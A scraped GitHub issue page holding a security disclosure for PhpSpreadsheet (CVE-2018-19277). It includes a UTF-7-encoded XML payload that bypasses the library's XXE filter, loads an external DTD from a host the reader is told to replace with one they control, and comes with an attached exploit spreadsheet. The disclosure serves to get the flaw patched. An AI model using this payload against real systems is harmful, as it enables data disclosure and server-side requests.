## Description

[![@xarem](https://avatars.githubusercontent.com/u/647483?v=4&size=48)](/xarem)[xarem](https://github.com/xarem)opened [on Nov 22, 2018](https://github.com/MewesK/TwigSpreadsheetBundle/issues/18#issue-383617801)

It's necessary to update phpoffice/phpspreadsheet because of [CVE-2018-19277](https://github.com/advisories/GHSA-xcrg-29h7-h4cj "CVE-2018-19277")

## Description

[![@xarem](https://avatars.githubusercontent.com/u/647483?v=4&size=48)](/xarem)[xarem](https://github.com/xarem)opened [on Nov 22, 2018](https://github.com/MewesK/TwigSpreadsheetBundle/issues/18#issue-383617801)

It's necessary to update phpoffice/phpspreadsheet because of [CVE-2018-19277](https://github.com/advisories/GHSA-xcrg-29h7-h4cj "CVE-2018-19277")

## Description

[![@alxjsn](https://avatars.githubusercontent.com/u/3642823?u=703c1807bfed9f2947e3110371b0094164ef37ed&v=4&size=48)](/alxjsn)[alxjsn](https://github.com/alxjsn)opened [on Nov 12, 2018](https://github.com/PHPOffice/PhpSpreadsheet/issues/771#issue-379945183)

This is:

```
- [X] a bug report
- [ ] a feature request
- [ ] **not** a usage question (ask them on https://stackoverflow.com/questions/tagged/phpspreadsheet or https://gitter.im/PHPOffice/PhpSpreadsheet)

```
### What is the expected behavior?

The securityScan() function is used to prevent XXE attacks.

### What is the current behavior?

The securityScan() function can be bypassed by using UTF-7 encoding.

### What are the steps to reproduce?

/Details suppressed until after patch was released/

Replace the IP address and port `127.0.0.1:8080` with something you control.

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE xmlrootname +AFsAPAAh-ENTITY +ACU aaa SYSTEM +ACI-http://127.0.0.1:8080/ext.
dtd+ACIAPgAl-aaa+ADsAJQ-ccc+ADsAJQ-ddd+ADsAXQA+

```

sheet1.xml

Replace `sheet1.xml` in your xlsx file with the one above and re-zip the excel sheet. I've attached an xlsx file that makes a request as configured above.

File [exploit-localhost.xlsx](https://github.com/PHPOffice/PhpSpreadsheet/files/2573526/exploit-localhost.xlsx)

Set up a listener either with Python, netcat, etc. locally and watch for a request that will be made once the xlsx is read by the library.

Please let me know if you would like more details on generating the xlsx file or if you need any clarification about the issue.

### Which versions of PhpSpreadsheet and PHP are affected?

I believe it affects all versions.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
